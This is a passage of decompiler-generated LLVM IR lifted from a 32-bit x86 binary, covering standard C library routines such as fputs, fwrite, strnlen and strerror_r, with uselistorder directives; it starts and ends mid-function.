  store i32 %arg1, i32* %edx.global-to-local, align 4
  %v1_804f52d = add i32 %arg1, 28
  %v2_804f52d = inttoptr i32 %v1_804f52d to i32*
  %v3_804f52d = load i32, i32* %v2_804f52d, align 4
  %v2_804f530 = mul i32 %v3_804f52d, 4
  %v2_804f534 = ptrtoint i32* %stack_var_-52 to i32
  %v1_804f53b = add i32 %arg1, 40
  store i32 %v1_804f53b, i32* %eax.global-to-local, align 4
  %v3_804f53f = inttoptr i32 %v1_804f53b to i8*
  %v4_804f53f = call i32 @memcpy(i8* %v3_804f53f, i32 %v2_804f534, i32 %v2_804f530)
  store i32 %v4_804f53f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f547

dec_label_pc_804f547:                             ; preds = %dec_label_pc_804f50d, %dec_label_pc_804f521
  %stack_var_-96.4 = phi i32 [ %stack_var_-96.3, %dec_label_pc_804f521 ], [ %v1_804f4cc, %dec_label_pc_804f50d ]
  store i32 %stack_var_-96.4, i32* %eax.global-to-local, align 4
  store i32 %tmp67, i32* %ecx.global-to-local, align 4
  store i32 %stack_var_-96.4, i32* %v2_804f1a8, align 4
  %v0_804f552 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804f552 = add i32 %v0_804f552, 16
  %v2_804f552 = inttoptr i32 %v1_804f552 to i8*
  %v3_804f552 = load i8, i8* %v2_804f552, align 1
  %v5_804f552 = icmp slt i8 %v3_804f552, 0
  br i1 %v5_804f552, label %dec_label_pc_804f55f, label %dec_label_pc_804f558

dec_label_pc_804f558:                             ; preds = %dec_label_pc_804f547
  %v0_804f558 = load i32, i32* @esi, align 4
  %v1_804f558 = add i32 %v0_804f558, 1
  store i32 %v1_804f558, i32* %eax.global-to-local, align 4
  %v2_804f55b = inttoptr i32 %v0_804f552 to i32*
  store i32 %v1_804f558, i32* %v2_804f55b, align 4
  br label %dec_label_pc_804f572

dec_label_pc_804f55f:                             ; preds = %dec_label_pc_804f547
  store i32 %v4_804f180, i32* %edx.global-to-local, align 4
  %v0_804f563 = load i32, i32* @esi, align 4
  %v2_804f563 = sub i32 %v0_804f563, %v4_804f180
  store i32 %v2_804f563, i32* %esi.global-to-local, align 4
  %v1_804f565 = mul i32 %v2_804f563, 4
  %v2_804f565 = add i32 %v1_804f565, 288
  store i32 %v2_804f565, i32* %eax.global-to-local, align 4
  store i32 %tmp67, i32* %ecx.global-to-local, align 4
  %v1_804f570 = inttoptr i32 %tmp67 to i32*
  %v2_804f570 = load i32, i32* %v1_804f570, align 4
  %v4_804f570 = add i32 %v2_804f570, %v2_804f565
  store i32 %v4_804f570, i32* %v1_804f570, align 4
  br label %dec_label_pc_804f572

dec_label_pc_804f572:                             ; preds = %dec_label_pc_804f558, %dec_label_pc_804f55f
  store i32 %arg1, i32* @edx, align 4
  %v1_804f576 = add i32 %arg1, 28
  %v2_804f576 = inttoptr i32 %v1_804f576 to i32*
  %v3_804f576 = load i32, i32* %v2_804f576, align 4
  store i32 %v3_804f576, i32* %eax.global-to-local, align 4
  %v1_804f579 = add i32 %v3_804f576, 2
  br label %dec_label_pc_804f581

dec_label_pc_804f581:                             ; preds = %dec_label_pc_804f1c4, %dec_label_pc_804f270, %dec_label_pc_804f300, %dec_label_pc_804f309, %dec_label_pc_804f31d, %dec_label_pc_804f2a1, %dec_label_pc_804f4bf, %dec_label_pc_804f378, %dec_label_pc_804f43a, %dec_label_pc_804f572
  %stack_var_-20.5 = phi i32 [ %stack_var_-20.3, %dec_label_pc_804f572 ], [ %stack_var_-20.3, %dec_label_pc_804f43a ], [ %stack_var_-20.3, %dec_label_pc_804f378 ], [ %stack_var_-20.3, %dec_label_pc_804f4bf ], [ %stack_var_-20.1, %dec_label_pc_804f270 ], [ %stack_var_-20.3, %dec_label_pc_804f300 ], [ %stack_var_-20.3, %dec_label_pc_804f309 ], [ %stack_var_-20.3, %dec_label_pc_804f31d ], [ %stack_var_-20.1, %dec_label_pc_804f2a1 ], [ %tmp71, %dec_label_pc_804f1c4 ]
  %storemerge5 = phi i32 [ %v1_804f579, %dec_label_pc_804f572 ], [ -1, %dec_label_pc_804f43a ], [ -1, %dec_label_pc_804f378 ], [ -1, %dec_label_pc_804f4bf ], [ -1, %dec_label_pc_804f270 ], [ -1, %dec_label_pc_804f300 ], [ -1, %dec_label_pc_804f309 ], [ -1, %dec_label_pc_804f31d ], [ -1, %dec_label_pc_804f2a1 ], [ -1, %dec_label_pc_804f1c4 ]
  store i32 %storemerge5, i32* %eax.global-to-local, align 4
  store i32 %stack_var_-20.5, i32* @ebx, align 4
  %v2_804f585 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804f585, i32* @esi, align 4
  store i32 %v0_804f17f, i32* @edi, align 4
  store i32 %v0_804f17e, i32* %ebp.global-to-local, align 4
  ret i32 %storemerge5

; uselistorder directives
  uselistorder i32 %stack_var_-96.4, { 1, 0 }
  uselistorder i32 %v1_804f50d, { 0, 2, 1 }
  uselistorder i32 %v1_804f4cc, { 0, 4, 3, 2, 1, 5 }
  uselistorder i32 %v1_804f4bf, { 1, 0 }
  uselistorder i32 %v6_804f4b9, { 1, 2, 0 }
  uselistorder i32 %v0_804f4cc, { 4, 3, 0, 6, 5, 1, 2, 7, 8 }
  uselistorder i32 %v1_804f49a, { 1, 0 }
  uselistorder i32 %stack_var_-100.2.off0, { 1, 0, 2 }
  uselistorder i32 %v1_804f4b7, { 0, 2, 3, 1, 5, 4 }
  uselistorder i32 %v1_804f3df, { 1, 2, 0 }
  uselistorder i32 %v1_804f3b1, { 1, 2, 0 }
  uselistorder i32 %v0_804f3df, { 2, 0, 1, 3 }
  uselistorder i32 %v2_804f37c, { 1, 0 }
  uselistorder i32 %v1_804f36b, { 0, 1, 4, 3, 2 }
  uselistorder i32 %v0_804f374, { 0, 1, 2, 3, 6, 5, 4 }
  uselistorder i32 %v1_804f35e, { 0, 2, 3, 1 }
  uselistorder i32 %v6_804f355, { 1, 0 }
  uselistorder i32 %v1_804f339, { 1, 0 }
  uselistorder i32 %v0_804f355.pre.pre, { 0, 2, 3, 1 }
  uselistorder i32 %stack_var_-96.3, { 1, 0, 2, 3 }
  uselistorder i32 %v1_804f320, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_804f317, { 1, 2, 0 }
  uselistorder i32 %stack_var_-20.3, { 0, 1, 2, 3, 5, 6, 4, 7, 8 }
  uselistorder i32 %v0_804f2dd, { 1, 0 }
  uselistorder i32 %v1_804f2ca, { 1, 0 }
  uselistorder i32 %v6_804f2c8, { 2, 0, 1 }
  uselistorder i32 %v2_804f2d9, { 0, 2, 1 }
  uselistorder i32 %v1_804f2cf, { 1, 0 }
  uselistorder i8* %v1_804f2cb, { 1, 0 }
  uselistorder i32 %v6_804f2c8129, { 1, 0, 2 }
  uselistorder i32 %v0_804f2ea, { 1, 2, 4, 3, 0 }
  uselistorder i32 %v5_804f282, { 1, 2, 0 }
  uselistorder i8 %v2_804f24d.lcssa, { 1, 0 }
  uselistorder i32 %v0_804f24c.lcssa, { 3, 2, 1, 4, 0 }
  uselistorder i32 %v1_804f23e.lcssa, { 6, 5, 2, 4, 1, 8, 7, 0, 3 }
  uselistorder i32 %v6_804f24d, { 1, 0 }
  uselistorder i32 %v3_804f24d, { 2, 3, 1, 0 }
  uselistorder i8 %v2_804f24d, { 0, 2, 1 }
  uselistorder i32 %v1_804f24c, { 0, 2, 3, 1 }
  uselistorder i32 %storemerge7, { 0, 2, 1 }
  uselistorder i32 %v3_804f23e, { 1, 0 }
  uselistorder i32 %v1_804f229, { 1, 0 }
  uselistorder i32 %v1_804f23e121, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v0_804f252.pre, { 4, 2, 3, 0, 1 }
  uselistorder i32 %v0_804f2af, { 1, 2, 4, 6, 0, 5, 3, 7 }
  uselistorder i32 %stack_var_-96.1, { 1, 6, 2, 3, 0, 4, 5 }
  uselistorder i64 %stack_var_-100.1, { 3, 2, 0, 1 }
  uselistorder i32 %v0_804f20e, { 0, 1, 3, 2 }
  uselistorder i32 %stack_var_-20.1, { 0, 1, 2, 3, 6, 4, 5 }
  uselistorder i32 %v0_804f20c, { 1, 0 }
  uselistorder i32 %v1_804f1ec, { 0, 2, 1 }
  uselistorder i32 %v0_804f1e8, { 1, 0 }
  uselistorder i32 %v1_804f1db, { 1, 0 }
  uselistorder i32 %v5_804f1d1, { 1, 0, 2 }
  uselistorder i32 %v4_804f180, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %stack_var_-52, { 1, 0 }
  uselistorder i32 %tmp67, { 16, 15, 14, 13, 1, 12, 11, 10, 9, 8, 6, 7, 0, 5, 4, 3, 2 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 7 }
  uselistorder i32* %ecx.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 15, 10, 11, 12, 13, 14, 16, 17, 18, 1, 0, 19, 22, 20, 21 }
  uselistorder i32* %ebp.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 9, 7, 10, 8, 11, 12 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 41, 28, 27, 29, 30, 40, 32, 31, 42, 33, 34, 35, 36, 37, 38, 39 }
  uselistorder i8 1, { 3, 4, 5, 6, 0, 1, 7, 2 }
  uselistorder i32 38, { 1, 0 }
  uselistorder i32 (i32)* @_promoted_size, { 1, 0 }
  uselistorder i32 21, { 1, 0 }
  uselistorder i32 -5, { 1, 0 }
  uselistorder i32 -134550379, { 1, 0 }
  uselistorder i32 17, { 2, 0, 1, 4, 5, 3 }
  uselistorder i32 ptrtoint ([21 x i8]* @global_var_8051378.133 to i32), { 1, 0, 2 }
  uselistorder i8 46, { 0, 1, 8, 6, 7, 2, 3, 4, 5 }
  uselistorder i32 -2147483648, { 4, 7, 1, 2, 3, 5, 6, 0 }
  uselistorder i32 76, { 3, 4, 5, 6, 7, 8, 1, 0, 14, 9, 10, 13, 11, 12, 2 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i32 2147483647, { 3, 4, 5, 1, 0, 2, 6 }
  uselistorder i32* @global_var_8053338, { 3, 5, 0, 1, 6, 7, 4, 2 }
  uselistorder i32 %arg1, { 13, 12, 0, 11, 10, 9, 8, 6, 5, 3, 7, 4, 2, 1 }
  uselistorder label %dec_label_pc_804f581, { 9, 6, 8, 7, 4, 3, 2, 5, 1, 0 }
  uselistorder label %dec_label_pc_804f572, { 1, 0 }
  uselistorder label %dec_label_pc_804f547, { 1, 0 }
  uselistorder label %dec_label_pc_804f50d, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f4b9, { 1, 0 }
  uselistorder label %dec_label_pc_804f48d, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804f3a5, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804f378, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f350, { 1, 0 }
  uselistorder label %dec_label_pc_804f32d, { 1, 0 }
  uselistorder label %dec_label_pc_804f2f4, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_804f2d4, { 1, 0 }
  uselistorder label %dec_label_pc_804f296, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f24c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804f229, { 1, 0 }
  uselistorder label %dec_label_pc_804f225, { 1, 0 }
  uselistorder label %dec_label_pc_804f20e, { 1, 0 }
  uselistorder label %dec_label_pc_804f20c, { 1, 0 }
  uselistorder label %dec_label_pc_804f1fb, { 1, 0 }
}

define i32 @__GI_fputs_unlocked() local_unnamed_addr {
entry:
  %tmp = call i8* @__decompiler_undefined_function_4()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_804f58c = load i32, i32* @esi, align 4
  %v0_804f58d = load i32, i32* @ebx, align 4
  store i32 %v0_804f58d, i32* %stack_var_-8, align 4
  store i32 %tmp5, i32* @ebx, align 4
  %v5_804f592 = inttoptr i32 %tmp5 to i8*
  %v3_804f593 = call i32 @strlen(i8* %v5_804f592)
  store i32 %v3_804f593, i32* @esi, align 4
  %tmp13 = ptrtoint i8* %tmp to i32
  %v0_804f5a2 = load i32, i32* @ebx, align 4
  %v6_804f5a3 = call i32 @__GI_fwrite_unlocked(i32 %v0_804f5a2, i64 1, i32 %v3_804f593, i32 %tmp13)
  %v1_804f5ae = load i32, i32* @esi, align 4
  %v12_804f5ae = icmp eq i32 %v6_804f5a3, %v1_804f5ae
  %v1_804f5b0 = icmp eq i1 %v12_804f5ae, false
  br i1 %v1_804f5b0, label %dec_label_pc_804f5b4, label %dec_label_pc_804f5b2

dec_label_pc_804f5b2:                             ; preds = %entry
  br label %dec_label_pc_804f5b4

dec_label_pc_804f5b4:                             ; preds = %entry, %dec_label_pc_804f5b2
  %v0_804f5b4 = phi i32 [ -1, %entry ], [ %v6_804f5a3, %dec_label_pc_804f5b2 ]
  %v2_804f5b6 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804f5b6, i32* @ebx, align 4
  store i32 %v0_804f58c, i32* @esi, align 4
  ret i32 %v0_804f5b4

; uselistorder directives
  uselistorder i32 %v6_804f5a3, { 1, 0 }
  uselistorder i32 %tmp5, { 1, 0 }
  uselistorder label %dec_label_pc_804f5b4, { 1, 0 }
}

define i32 @__GI_fwrite_unlocked(i32 %arg1, i64 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp6 = inttoptr i32 %arg4 to i16*
  %stack_var_-24 = alloca i32, align 4
  %v0_804f5bc = load i32, i32* @edi, align 4
  %v0_804f5bd = load i32, i32* @esi, align 4
  %v0_804f5be = load i32, i32* @ebx, align 4
  %v4_804f5bf = trunc i64 %arg2 to i32
  store i32 %v4_804f5bf, i32* @edi, align 4
  store i32 %arg3, i32* @ebx, align 4
  store i32 %arg4, i32* @esi, align 4
  %v2_804f5cb = load i16, i16* %tmp6, align 2
  %v1_804f5ce = and i16 %v2_804f5cb, 192
  %v6_804f5d3 = icmp eq i16 %v1_804f5ce, 192
  br i1 %v6_804f5d3, label %dec_label_pc_804f5eb, label %dec_label_pc_804f5da

dec_label_pc_804f5da:                             ; preds = %entry
  %v8_804f5e0 = call i32 @__stdio_trans2w_o(i16* %tmp6, i32 128, i32 %v0_804f5be, i32 %v0_804f5bd, i32 %v0_804f5bc)
  %v1_804f5e7 = icmp eq i32 %v8_804f5e0, 0
  %v1_804f5e9 = icmp eq i1 %v1_804f5e7, false
  br i1 %v1_804f5e9, label %dec_label_pc_804f624, label %dec_label_pc_804f5eb

dec_label_pc_804f5eb:                             ; preds = %dec_label_pc_804f5da, %entry
  %v2_804f5eb = icmp eq i32 %v4_804f5bf, 0
  br i1 %v2_804f5eb, label %dec_label_pc_804f624, label %dec_label_pc_804f5ef

dec_label_pc_804f5ef:                             ; preds = %dec_label_pc_804f5eb
  %v1_804f5ef = icmp eq i32 %arg3, 0
  br i1 %v1_804f5ef, label %dec_label_pc_804f624, label %dec_label_pc_804f5f3

dec_label_pc_804f5f3:                             ; preds = %dec_label_pc_804f5ef
  %v9_804f5f8 = udiv i64 4294967295, %arg2
  %v10_804f5f8 = trunc i64 %v9_804f5f8 to i32
  %v6_804f5fc = icmp ult i32 %v10_804f5f8, %arg3
  %v0_804f615 = load i32, i32* @esi, align 4
  %v1_804f615 = inttoptr i32 %v0_804f615 to i16*
  br i1 %v6_804f5fc, label %dec_label_pc_804f615, label %dec_label_pc_804f5fe

dec_label_pc_804f5fe:                             ; preds = %dec_label_pc_804f5f3
  %v3_804f5ff = sext i32 %arg3 to i64
  %v5_804f5ff = mul nsw i64 %v3_804f5ff, %arg2
  %v6_804f5ff = trunc i64 %v5_804f5ff to i32
  store i32 %v6_804f5ff, i32* @ebx, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v5_804f607 = inttoptr i32 %arg1 to i8*
  %v6_804f607 = call i32 @__stdio_fwrite(i8* %v5_804f607, i32 %v6_804f5ff, i32 %v0_804f615)
  %v7_804f607 = sext i32 %v6_804f607 to i64
  %v10_804f60e = udiv i64 %v7_804f607, %arg2
  %v11_804f60e = trunc i64 %v10_804f60e to i32
  br label %dec_label_pc_804f626

dec_label_pc_804f615:                             ; preds = %dec_label_pc_804f5f3
  %v2_804f615 = load i16, i16* %v1_804f615, align 2
  %v3_804f615 = or i16 %v2_804f615, 8
  store i16 %v3_804f615, i16* %v1_804f615, align 2
  %v0_804f619 = load i32, i32* %stack_var_-24, align 4
  %v1_804f619 = call i32 @__GI___errno_location(i32 %v0_804f619)
  %v1_804f61e = inttoptr i32 %v1_804f619 to i32*
  store i32 22, i32* %v1_804f61e, align 4
  br label %dec_label_pc_804f624

dec_label_pc_804f624:                             ; preds = %dec_label_pc_804f5ef, %dec_label_pc_804f5eb, %dec_label_pc_804f5da, %dec_label_pc_804f615
  br label %dec_label_pc_804f626

dec_label_pc_804f626:                             ; preds = %dec_label_pc_804f5fe, %dec_label_pc_804f624
  %v0_804f629 = phi i32 [ %v11_804f60e, %dec_label_pc_804f5fe ], [ 0, %dec_label_pc_804f624 ]
  store i32 %v0_804f5bd, i32* @esi, align 4
  store i32 %v0_804f5bc, i32* @edi, align 4
  ret i32 %v0_804f629

; uselistorder directives
  uselistorder i32 (i8*, i32, i32)* @__stdio_fwrite, { 2, 3, 4, 6, 7, 1, 5, 0 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder i64 %arg2, { 2, 0, 1, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804f626, { 1, 0 }
  uselistorder label %dec_label_pc_804f624, { 3, 0, 1, 2 }
}

define i32 @strnlen() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %v1_804f634 = add i32 %tmp, 1
  %v1_804f635 = add i32 %tmp3, -1
  br label %dec_label_pc_804f638

dec_label_pc_804f638:                             ; preds = %dec_label_pc_804f63c, %entry
  %v0_804f639 = phi i32 [ %v1_804f639, %dec_label_pc_804f63c ], [ %v1_804f634, %entry ]
  %v0_804f638 = phi i32 [ %v1_804f638, %dec_label_pc_804f63c ], [ %v1_804f635, %entry ]
  %v1_804f638 = add i32 %v0_804f638, 1
  %v1_804f639 = add i32 %v0_804f639, -1
  %v8_804f639 = icmp eq i32 %v1_804f639, 0
  br i1 %v8_804f639, label %dec_label_pc_804f641, label %dec_label_pc_804f63c

dec_label_pc_804f63c:                             ; preds = %dec_label_pc_804f638
  %v1_804f63c = inttoptr i32 %v1_804f638 to i8*
  %v2_804f63c = load i8, i8* %v1_804f63c, align 1
  %v3_804f63c = icmp eq i8 %v2_804f63c, 0
  %v1_804f63f = icmp eq i1 %v3_804f63c, false
  br i1 %v1_804f63f, label %dec_label_pc_804f638, label %dec_label_pc_804f641

dec_label_pc_804f641:                             ; preds = %dec_label_pc_804f63c, %dec_label_pc_804f638
  %v2_804f641 = sub i32 %v1_804f638, %tmp3
  ret i32 %v2_804f641

; uselistorder directives
  uselistorder i32 %v1_804f639, { 1, 0 }
}

define i32 @__GI___glibc_strerror_r() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %v0_804f644 = load i32, i32* @ebx, align 4
  store i32 %tmp2, i32* @ebx, align 4
  %v4_804f652 = call i32 @__xpg_strerror_r(i32 %tmp, i32 %tmp2, i32 %tmp1, i32 %v0_804f644)
  %v0_804f65a = load i32, i32* @ebx, align 4
  ret i32 %v0_804f65a
}

define i32 @__xpg_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-17 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-76 = alloca i8*, align 4
  %v0_804f661 = load i32, i32* @edi, align 4
  %v0_804f662 = load i32, i32* @esi, align 4
  %v0_804f663 = load i32, i32* @ebx, align 4
  store i32 %arg3, i32* @ebx, align 4
  %v6_804f672 = icmp ugt i32 %arg1, 124
  br i1 %v6_804f672, label %dec_label_pc_804f69a, label %dec_label_pc_804f674

dec_label_pc_804f674:                             ; preds = %entry
  store i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_80513cc.138, i32 0, i32 0), i8** %stack_var_-76, align 4
  %v1_804f68c7 = icmp eq i32 %arg1, 0
  %v1_804f68e14 = icmp eq i1 %v1_804f68c7, false
  br i1 %v1_804f68e14, label %dec_label_pc_804f67f, label %dec_label_pc_804f690

dec_label_pc_804f67f:                             ; preds = %dec_label_pc_804f674, %dec_label_pc_804f67f
  %v0_804f685 = phi i32 [ %v3_804f685, %dec_label_pc_804f67f ], [ %arg1, %dec_label_pc_804f674 ]
  %v2_804f67f = phi i8* [ %v4_804f689, %dec_label_pc_804f67f ], [ getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_80513cc.138, i32 0, i32 0), %dec_label_pc_804f674 ]
  %v3_804f67f = ptrtoint i8* %v2_804f67f to i32
  %v2_804f682 = load i8, i8* %v2_804f67f, align 1
  %v7_804f682 = icmp eq i8 %v2_804f682, 0
  %v2_804f685 = zext i1 %v7_804f682 to i32
  %v3_804f685 = add i32 %v2_804f685, %v0_804f685
  %v16_804f685 = icmp eq i32 %v3_804f685, 0
  %v1_804f688 = add i32 %v3_804f67f, 1
  %v4_804f689 = inttoptr i32 %v1_804f688 to i8*
  store i8* %v4_804f689, i8** %stack_var_-76, align 4
  %v1_804f68e = icmp eq i1 %v16_804f685, false
  br i1 %v1_804f68e, label %dec_label_pc_804f67f, label %dec_label_pc_804f690

dec_label_pc_804f690:                             ; preds = %dec_label_pc_804f67f, %dec_label_pc_804f674
  %v2_804f6d4420 = phi i32 [ ptrtoint ([8 x i8]* @global_var_80513cc.138 to i32), %dec_label_pc_804f674 ], [ %v1_804f688, %dec_label_pc_804f67f ]
  %v2_804f692 = phi i8* [ getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_80513cc.138, i32 0, i32 0), %dec_label_pc_804f674 ], [ %v4_804f689, %dec_label_pc_804f67f ]
  store i32 0, i32* @ebp, align 4
  %v2_804f695 = load i8, i8* %v2_804f692, align 1
  %v3_804f695 = icmp eq i8 %v2_804f695, 0
  %v1_804f698 = icmp eq i1 %v3_804f695, false
  br i1 %v1_804f698, label %dec_label_pc_804f690.dec_label_pc_804f6c6_crit_edge, label %dec_label_pc_804f69a

dec_label_pc_804f690.dec_label_pc_804f6c6_crit_edge: ; preds = %dec_label_pc_804f690
  %.pre = bitcast i8** %stack_var_-76 to i32*
  br label %dec_label_pc_804f6c6

dec_label_pc_804f69a:                             ; preds = %dec_label_pc_804f690, %entry
  %v1_804f69e = ashr i32 %arg1, 31
  store i32 %v1_804f69e, i32* %stack_var_-88, align 4
  %v7_804f6a6 = bitcast i32* %stack_var_-17 to i8*
  %v8_804f6a6 = call i32 @_uintmaxtostr(i8* %v7_804f6a6, i32 %arg1, i32 %v1_804f69e, i32 -10, i32 0)
  %v1_804f6ab = add i32 %v8_804f6a6, -14
  %v5_804f6ae = inttoptr i32 %v1_804f6ab to i8*
  store i8* %v5_804f6ae, i8** %stack_var_-76, align 4
  store i32 ptrtoint ([15 x i8]* @global_var_80513bc.139 to i32), i32* %esi.global-to-local, align 4
  store i32 %v1_804f6ab, i32* %edi.global-to-local, align 4
  %v4_804f6b9 = inttoptr i32 %v1_804f6ab to i32*
  store i32 1852534357, i32* %v4_804f6b9, align 4
  %v5_804f6b9 = load i32, i32* %edi.global-to-local, align 4
  %v6_804f6b9 = load i32, i32* %esi.global-to-local, align 4
  %v7_804f6b9 = load i1, i1* @df, align 1
  %v8_804f6b9 = select i1 %v7_804f6b9, i32 -4, i32 4
  %v9_804f6b9 = add i32 %v8_804f6b9, %v5_804f6b9
  %v10_804f6b9 = add i32 %v8_804f6b9, %v6_804f6b9
  store i32 %v9_804f6b9, i32* %edi.global-to-local, align 4
  store i32 %v10_804f6b9, i32* %esi.global-to-local, align 4
  %v1_804f6ba = inttoptr i32 %v10_804f6b9 to i32*
  %v2_804f6ba = load i32, i32* %v1_804f6ba, align 4
  %v4_804f6ba = inttoptr i32 %v9_804f6b9 to i32*
  store i32 %v2_804f6ba, i32* %v4_804f6ba, align 4
  %v5_804f6ba = load i32, i32* %edi.global-to-local, align 4
  %v6_804f6ba = load i32, i32* %esi.global-to-local, align 4
  %v9_804f6ba = add i32 %v5_804f6ba, %v8_804f6b9
  %v10_804f6ba = add i32 %v6_804f6ba, %v8_804f6b9
  store i32 %v9_804f6ba, i32* %edi.global-to-local, align 4
  store i32 %v10_804f6ba, i32* %esi.global-to-local, align 4
  %v1_804f6bb = inttoptr i32 %v10_804f6ba to i32*
  %v2_804f6bb = load i32, i32* %v1_804f6bb, align 4
  %v4_804f6bb = inttoptr i32 %v9_804f6ba to i32*
  store i32 %v2_804f6bb, i32* %v4_804f6bb, align 4
  %v5_804f6bb = load i32, i32* %edi.global-to-local, align 4
  %v6_804f6bb = load i32, i32* %esi.global-to-local, align 4
  %v9_804f6bb = add i32 %v5_804f6bb, %v8_804f6b9
  %v10_804f6bb = add i32 %v6_804f6bb, %v8_804f6b9
  store i32 %v9_804f6bb, i32* %edi.global-to-local, align 4
  store i32 %v10_804f6bb, i32* %esi.global-to-local, align 4
  %v1_804f6bc = inttoptr i32 %v10_804f6bb to i16*
  %v2_804f6bc = load i16, i16* %v1_804f6bc, align 2
  %v4_804f6bc = inttoptr i32 %v9_804f6bb to i16*
  store i16 %v2_804f6bc, i16* %v4_804f6bc, align 2
  %v6_804f6bc = load i32, i32* %esi.global-to-local, align 4
  %v8_804f6bc = select i1 %v7_804f6b9, i32 -2, i32 2
  %v10_804f6bc = add i32 %v6_804f6bc, %v8_804f6bc
  store i32 %v10_804f6bc, i32* %esi.global-to-local, align 4
  store i32 22, i32* @ebp, align 4
  %v0_804f6d2.pre = load i32, i32* @ebx, align 4
  %.phi.trans.insert = bitcast i8** %stack_var_-76 to i32*
  %v2_804f6d44.pre = load i32, i32* %.phi.trans.insert, align 4
  br label %dec_label_pc_804f6c6

dec_label_pc_804f6c6:                             ; preds = %dec_label_pc_804f690.dec_label_pc_804f6c6_crit_edge, %dec_label_pc_804f69a
  %.pre-phi = phi i32* [ %.pre, %dec_label_pc_804f690.dec_label_pc_804f6c6_crit_edge ], [ %.phi.trans.insert, %dec_label_pc_804f69a ]
  %v2_804f6d44 = phi i32 [ %v2_804f6d4420, %dec_label_pc_804f690.dec_label_pc_804f6c6_crit_edge ], [ %v2_804f6d44.pre, %dec_label_pc_804f69a ]
  %v0_804f6d2 = phi i32 [ %arg3, %dec_label_pc_804f690.dec_label_pc_804f6c6_crit_edge ], [ %v0_804f6d2.pre, %dec_label_pc_804f69a ]
  %v4_804f6c8 = icmp eq i32 %arg2, 0
  %v1_804f6cd = icmp eq i1 %v4_804f6c8, false
  %v2_804f6d2 = select i1 %v1_804f6cd, i32 %v0_804f6d2, i32 0
  %v0_804f6d7.cast = inttoptr i32 %v2_804f6d44 to i8*
  %v3_804f6d7 = call i32 @strlen(i8* %v0_804f6d7.cast)
  %v1_804f6dd = add i32 %v3_804f6d7, 1
  store i32 %v1_804f6dd, i32* @esi, align 4
  %tmp41 = icmp ugt i32 %v1_804f6dd, %v2_804f6d2
  br i1 %tmp41, label %dec_label_pc_804f6e4, label %dec_label_pc_804f6eb

dec_label_pc_804f6e4:                             ; preds = %dec_label_pc_804f6c6
  store i32 %v2_804f6d2, i32* @esi, align 4
  store i32 34, i32* @ebp, align 4
  br label %dec_label_pc_804f6eb

dec_label_pc_804f6eb:                             ; preds = %dec_label_pc_804f6c6, %dec_label_pc_804f6e4
  %v0_804f6ef = phi i32 [ %v1_804f6dd, %dec_label_pc_804f6c6 ], [ %v2_804f6d2, %dec_label_pc_804f6e4 ]
  %v1_804f6eb = icmp eq i32 %v0_804f6ef, 0
  br i1 %v1_804f6eb, label %dec_label_pc_804f709, label %dec_label_pc_804f6ef

dec_label_pc_804f6ef:                             ; preds = %dec_label_pc_804f6eb
  %v3_804f6f05 = load i32, i32* %.pre-phi, align 4
  store i32 %arg2, i32* %stack_var_-88, align 4
  %v5_804f6f8 = inttoptr i32 %arg2 to i8*
  %v6_804f6f8 = call i32 @memcpy(i8* %v5_804f6f8, i32 %v3_804f6f05, i32 %v0_804f6ef)
  %v0_804f701 = load i32, i32* @esi, align 4
  %v2_804f701 = add i32 %arg2, -1
  %v3_804f701 = add i32 %v2_804f701, %v0_804f701
  %v4_804f701 = inttoptr i32 %v3_804f701 to i8*
  store i8 0, i8* %v4_804f701, align 1
  br label %dec_label_pc_804f709

dec_label_pc_804f709:                             ; preds = %dec_label_pc_804f6eb, %dec_label_pc_804f6ef
  %v0_804f709 = load i32, i32* @ebp, align 4
  %v1_804f709 = icmp eq i32 %v0_804f709, 0
  br i1 %v1_804f709, label %dec_label_pc_804f714, label %dec_label_pc_804f70d

dec_label_pc_804f70d:                             ; preds = %dec_label_pc_804f709
  %v0_804f70d = load i32, i32* %stack_var_-88, align 4
  %v1_804f70d = call i32 @__GI___errno_location(i32 %v0_804f70d)
  %v0_804f712 = load i32, i32* @ebp, align 4
  %v2_804f712 = inttoptr i32 %v1_804f70d to i32*
  store i32 %v0_804f712, i32* %v2_804f712, align 4
  %v0_804f714.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_804f714

